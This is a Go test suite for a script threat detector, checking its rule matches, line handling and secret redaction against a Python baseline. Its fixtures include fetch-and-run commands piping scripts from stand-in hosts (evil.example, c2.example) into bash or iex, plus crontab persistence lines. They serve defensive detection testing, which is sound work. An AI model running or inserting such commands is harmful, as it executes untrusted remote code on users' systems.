package threat

import (
	"encoding/json"
	"os"
	"slices"
	"strings"
	"testing"

	"siq-agent-security/apps/agentshield/internal/rulepack"
)

// Shared corpus with the Python baseline (docs/detection-baseline.md).
const corpusPath = "../../../control-api/app/tests/fixtures/threat/corpus.json"

// Field-level oracle produced by apps/control-api/scripts/gen_threat_match_oracle_v1.py
// (Python analyzer as independent producer for the shared regex layer).
const oraclePath = "../../../control-api/app/tests/fixtures/threat/match_oracle_v1.json"

type sample struct {
	ID       string `json:"id"`
	Label    string `json:"label"`
	Category string `json:"category"`
	RuleID   string `json:"rule_id"`
	Filename string `json:"filename"`
	Content  string `json:"content"`
}

func loadCorpus(t *testing.T) []sample {
	t.Helper()
	raw, err := os.ReadFile(corpusPath)
	if err != nil {
		t.Skipf("shared corpus not available: %v", err)
	}
	var doc struct {
		Samples []sample `json:"samples"`
	}
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}
	return doc.Samples
}

func analyzer(t *testing.T) *Analyzer {
	t.Helper()
	p, err := rulepack.Builtin()
	if err != nil {
		t.Fatal(err)
	}
	return New(p)
}

func ruleIDs(r Result) map[string]bool {
	out := map[string]bool{}
	for _, m := range r.Matches {
		out[m.RuleID] = true
	}
	return out
}

// Parity with the Python engine on the shared corpus: every malicious sample
// must hit its labelled rule, every benign sample must be clean, and the one
// recorded false positive must still fire (so a future rule change that fixes
// it forces the corpus and both implementations to be updated together).
func TestCorpusParityWithPython(t *testing.T) {
	a := analyzer(t)
	var malicious, benign int
	for _, s := range loadCorpus(t) {
		got := ruleIDs(a.Analyze([]byte(s.Content), s.Filename, ""))
		switch s.Label {
		case "malicious":
			malicious++
			if !got[s.RuleID] {
				t.Errorf("%s: expected %s, got %v", s.ID, s.RuleID, keys(got))
			}
		case "benign":
			benign++
			if len(got) != 0 {
				t.Errorf("%s: benign sample produced %v", s.ID, keys(got))
			}
		case "benign_known_fp":
			if !got[s.RuleID] {
				t.Errorf("%s: recorded false positive %s no longer fires; update corpus + detection-baseline.md", s.ID, s.RuleID)
			}
		default:
			t.Errorf("%s: unknown label %q", s.ID, s.Label)
		}
	}
	if malicious < 20 || benign < 10 {
		t.Fatalf("corpus too small: malicious=%d benign=%d", malicious, benign)
	}
}

// Every rulepack rule (regex layer) must be exercised by the corpus, so the Go
// port cannot silently lose coverage relative to Python.
func TestEveryRuleCoveredByCorpus(t *testing.T) {
	a := analyzer(t)
	covered := map[string]bool{}
	for _, s := range loadCorpus(t) {
		if s.Label != "malicious" {
			continue
		}
		for id := range ruleIDs(a.Analyze([]byte(s.Content), s.Filename, "")) {
			covered[id] = true
		}
	}
	for _, r := range a.pack.Rules {
		if !covered[r.ID] {
			t.Errorf("rule %s never fires on the shared corpus", r.ID)
		}
	}
}

func TestCrontabRewriteKeepsPythonSemantics(t *testing.T) {
	// The negative lookahead (?![el]\b) was rewritten for RE2; these cases were
	// verified against the original pattern under CPython before the change.
	a := analyzer(t)
	hit := map[string]bool{
		"crontab -e":         false,
		"crontab -l":         false,
		"crontab -r":         true,
		"crontab -":          true,
		"crontab -ee":        true,
		"crontab -u root f":  true,
		"echo x | crontab":   true,
		"crontab -l > b":     false,
		"crontab -eX":        true,
		"systemctl status x": false,
	}
	for line, want := range hit {
		got := ruleIDs(a.Analyze([]byte(line+"\n"), "job.sh", ""))["threat-persist-crontab"]
		if got != want {
			t.Errorf("%q: crontab rule hit=%v want %v", line, got, want)
		}
	}
}

func TestExcerptIsRedactedAndTruncated(t *testing.T) {
	a := analyzer(t)
	secret := "sk-" + strings.Repeat("A", 40)
	r := a.Analyze([]byte("OPENAI_API_KEY=\""+secret+"\"\n"), "conf.sh", "")
	if len(r.Matches) == 0 {
		t.Fatal("hardcoded secret must be detected")
	}
	for _, m := range r.Matches {
		if strings.Contains(m.Excerpt, secret) {
			t.Fatalf("excerpt leaked secret: %s", m.Excerpt)
		}
		if len([]rune(m.Excerpt)) > ExcerptMax {
			t.Fatalf("excerpt longer than %d: %q", ExcerptMax, m.Excerpt)
		}
		if len(m.ExcerptSHA256) != 64 {
			t.Fatalf("excerpt_sha256 must be hex sha256")
		}
	}
}

func TestDetectTypeMirrorsPython(t *testing.T) {
	cases := []struct {
		content, filename, want string
	}{
		{"\x7fELF\x01\x02", "", "binary"},
		{"MZ\x90\x00", "", "binary"},
		{"PK\x03\x04", "skill.zip", "binary"},
		{"#!/usr/bin/env python3\nprint(1)\n", "", "python"},
		{"#!/bin/bash\nls\n", "", "shell"},
		{"#!/usr/bin/env pwsh\n", "", "powershell"},
		{"#!/usr/bin/env node\n", "", "javascript"},
		{"plain\x00text", "", "binary"},
		{"echo hi", "run.sh", "shell"},
		{"console.log(1)", "x.mjs", "javascript"},
		{"import os\n", "", "python"},
		{"just prose", "", "unknown"},
		{"\xff\xfe\xfd", "", "binary"},
	}
	for _, c := range cases {
		if got := DetectType([]byte(c.content), c.filename, ""); got != c.want {
			t.Errorf("DetectType(%q,%q)=%s want %s", c.content, c.filename, got, c.want)
		}
	}
	if got := DetectType([]byte("x"), "", "text/x-python; charset=utf-8"); got != "python" {
		t.Errorf("content-type hint ignored: %s", got)
	}
}

func TestFirstHitPerRuleOnly(t *testing.T) {
	a := analyzer(t)
	r := a.Analyze([]byte("curl a | sh\ncurl b | bash\n"), "x.sh", "")
	n := 0
	for _, m := range r.Matches {
		if m.RuleID == "threat-download-exec-pipe" {
			n++
			if m.Line != 1 {
				t.Fatalf("first hit must be line 1, got %d", m.Line)
			}
		}
	}
	if n != 1 {
		t.Fatalf("rule must be recorded once per blob, got %d", n)
	}
}

func TestShellBackslashContinuationJoinsDownloadExec(t *testing.T) {
	a := analyzer(t)
	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh \\\n| bash\n"
	r := a.Analyze([]byte(content), "x.sh", "")
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("continued curl|bash must hit threat-download-exec-pipe")
	}
	if hit.Line != 2 {
		t.Fatalf("line=%d want 2 (first physical line of continuation)", hit.Line)
	}
}

func TestShellPseudoPipeContinuationJoinsDownloadExec(t *testing.T) {
	a := analyzer(t)
	// No trailing backslash; next physical line starts with "|".
	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\n| bash\n"
	r := a.Analyze([]byte(content), "x.sh", "")
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("pseudo-pipe curl\\n| bash must hit threat-download-exec-pipe")
	}
	if hit.Line != 2 {
		t.Fatalf("line=%d want 2 (first physical line of pseudo pipe)", hit.Line)
	}
}

func TestUnicodeLineSeparatorSplitsLikePython(t *testing.T) {
	a := analyzer(t)
	// U+2028 LINE SEPARATOR between curl and "| bash" (DEV06-G / M-D2).
	content := "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\u2028| bash\n"
	r := a.Analyze([]byte(content), "x.sh", "")
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("U+2028-separated curl|bash must hit")
	}
	if hit.Line != 2 {
		t.Fatalf("line=%d want 2 after Unicode line split + pseudo-pipe join", hit.Line)
	}
}

func TestWordBoundaryRejectsCurlPrefix(t *testing.T) {
	a := analyzer(t)
	content := "#!/bin/bash\nnotcurl -fsSL https://evil.example/x.sh | bash\n"
	r := a.Analyze([]byte(content), "x.sh", "")
	for _, m := range r.Matches {
		if m.RuleID == "threat-download-exec-pipe" {
			t.Fatalf("\\bcurl\\b must not match notcurl; got line=%d excerpt=%q", m.Line, m.Excerpt)
		}
	}
}

func TestPowerShellPseudoPipeContinuationJoinsDownloadExec(t *testing.T) {
	a := analyzer(t)
	content := "Write-Host hi\niwr http://c2.example/update.ps1\n| iex\n"
	r := a.Analyze([]byte(content), "update.ps1", "")
	if r.DetectedType != "powershell" {
		t.Fatalf("detected_type=%s want powershell", r.DetectedType)
	}
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-powershell" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("PS pseudo-pipe iwr\\n| iex must hit threat-download-exec-powershell")
	}
	if hit.Line != 2 {
		t.Fatalf("line=%d want 2", hit.Line)
	}
}

func TestPythonDoesNotJoinPseudoPipe(t *testing.T) {
	a := analyzer(t)
	content := "print(\"curl http://x\")\n| not_shell\n"
	r := a.Analyze([]byte(content), "x.py", "")
	if r.DetectedType != "python" {
		t.Fatalf("detected_type=%s want python", r.DetectedType)
	}
	for _, m := range r.Matches {
		if m.RuleID == "threat-download-exec-pipe" {
			t.Fatal("python must not pseudo-pipe-join into download-exec")
		}
	}
}

func TestPowerShellBacktickContinuationJoinsDownloadExec(t *testing.T) {
	a := analyzer(t)
	content := "Write-Host hi\niwr http://c2.example/update.ps1 `\n| iex\n"
	r := a.Analyze([]byte(content), "update.ps1", "")
	if r.DetectedType != "powershell" {
		t.Fatalf("detected_type=%s want powershell", r.DetectedType)
	}
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-powershell" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("PS backtick-continued iwr|iex must hit threat-download-exec-powershell")
	}
	if hit.Line != 2 {
		t.Fatalf("line=%d want 2 (first physical line of PS continuation)", hit.Line)
	}
}

func TestShellDoesNotJoinPowerShellBacktick(t *testing.T) {
	a := analyzer(t)
	// Trailing backtick is not POSIX continuation; shell must keep physical lines.
	content := "#!/bin/bash\necho ready `\ncurl -fsSL https://evil.example/x.sh | bash\n"
	r := a.Analyze([]byte(content), "x.sh", "")
	if r.DetectedType != "shell" {
		t.Fatalf("detected_type=%s", r.DetectedType)
	}
	var hit *Match
	for i := range r.Matches {
		if r.Matches[i].RuleID == "threat-download-exec-pipe" {
			hit = &r.Matches[i]
			break
		}
	}
	if hit == nil {
		t.Fatal("expected hit on physical curl|bash line")
	}
	if hit.Line != 3 {
		t.Fatalf("shell must not join on backtick; line=%d want 3", hit.Line)
	}
}

func TestPythonTrailingBackslashNotJoined(t *testing.T) {
	a := analyzer(t)
	content := "path = \"foo\\\\\"\nos.system(\"ls\")\n"
	r := a.Analyze([]byte(content), "x.py", "")
	if r.DetectedType != "python" {
		t.Fatalf("detected_type=%s want python", r.DetectedType)
	}
	for _, m := range r.Matches {
		if m.RuleID == "threat-py-os-system-regex" && m.Line != 2 {
			t.Fatalf("python line must stay physical: got %d", m.Line)
		}
	}
}

type oracleMatch struct {
	RuleID        string  `json:"rule_id"`
	Line          int     `json:"line"`
	Excerpt       string  `json:"excerpt"`
	ExcerptSHA256 string  `json:"excerpt_sha256"`
	Severity      string  `json:"severity"`
	Confidence    float64 `json:"confidence"`
}

type oracleVector struct {
	SampleID            string       `json:"sample_id"`
	Label               string       `json:"label"`
	Filename            string       `json:"filename"`
	ContentSHA256       string       `json:"content_sha256"`
	DetectedType        string       `json:"detected_type"`
	ExpectedSharedMatch *oracleMatch `json:"expected_shared_match"`
	SharedRuleIDs       []string     `json:"shared_rule_ids"`
	PythonOnlyRuleIDs   []string     `json:"python_only_rule_ids"`
}

// TestMatchOracleFieldParity locks Go to the Python-produced field oracle:
// content sha256, detected_type, shared rule_id set, and labelled
// line/excerpt/excerpt_sha256/severity/confidence. AST-only hits must be empty on Go.
func TestMatchOracleFieldParity(t *testing.T) {
	raw, err := os.ReadFile(oraclePath)
	if err != nil {
		t.Skipf("match oracle not available: %v", err)
	}
	var doc struct {
		Schema            string         `json:"schema"`
		PythonOnlyRuleIDs []string       `json:"python_only_rule_ids"`
		Vectors           []oracleVector `json:"vectors"`
	}
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}
	if doc.Schema != "threat_match_oracle/v1" {
		t.Fatalf("unexpected schema %q", doc.Schema)
	}

	byID := map[string]sample{}
	for _, s := range loadCorpus(t) {
		byID[s.ID] = s
	}
	a := analyzer(t)
	for _, vec := range doc.Vectors {
		s, ok := byID[vec.SampleID]
		if !ok {
			t.Errorf("oracle sample %s missing from corpus", vec.SampleID)
			continue
		}
		got := a.Analyze([]byte(s.Content), s.Filename, "")
		if got.SHA256 != vec.ContentSHA256 {
			t.Errorf("%s: content sha256 %s want %s", vec.SampleID, got.SHA256, vec.ContentSHA256)
		}
		if got.DetectedType != vec.DetectedType {
			t.Errorf("%s: detected_type %s want %s", vec.SampleID, got.DetectedType, vec.DetectedType)
		}
		sharedIDs := make([]string, 0, len(got.Matches))
		byRule := map[string]Match{}
		for _, m := range got.Matches {
			sharedIDs = append(sharedIDs, m.RuleID)
			byRule[m.RuleID] = m
		}
		slices.Sort(sharedIDs)
		wantShared := append([]string(nil), vec.SharedRuleIDs...)
		slices.Sort(wantShared)
		if !slices.Equal(sharedIDs, wantShared) {
			t.Errorf("%s: shared rule ids %v want %v", vec.SampleID, sharedIDs, wantShared)
		}
		if len(vec.PythonOnlyRuleIDs) != 0 {
			// Oracle may list AST hits from Python; Go must not emit them.
			for _, id := range vec.PythonOnlyRuleIDs {
				if _, hit := byRule[id]; hit {
					t.Errorf("%s: Go must not emit python-only rule %s", vec.SampleID, id)
				}
			}
		}
		if vec.ExpectedSharedMatch == nil {
			continue
		}
		exp := vec.ExpectedSharedMatch
		m, ok := byRule[exp.RuleID]
		if !ok {
			t.Errorf("%s: missing labelled rule %s", vec.SampleID, exp.RuleID)
			continue
		}
		if m.Line != exp.Line || m.Excerpt != exp.Excerpt || m.ExcerptSHA256 != exp.ExcerptSHA256 {
			t.Errorf("%s/%s: line/excerpt mismatch got=(%d,%q,%s) want=(%d,%q,%s)",
				vec.SampleID, exp.RuleID,
				m.Line, m.Excerpt, m.ExcerptSHA256,
				exp.Line, exp.Excerpt, exp.ExcerptSHA256)
		}
		if m.Severity != exp.Severity || m.Confidence != exp.Confidence {
			t.Errorf("%s/%s: severity/confidence got=(%s,%v) want=(%s,%v)",
				vec.SampleID, exp.RuleID, m.Severity, m.Confidence, exp.Severity, exp.Confidence)
		}
	}
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
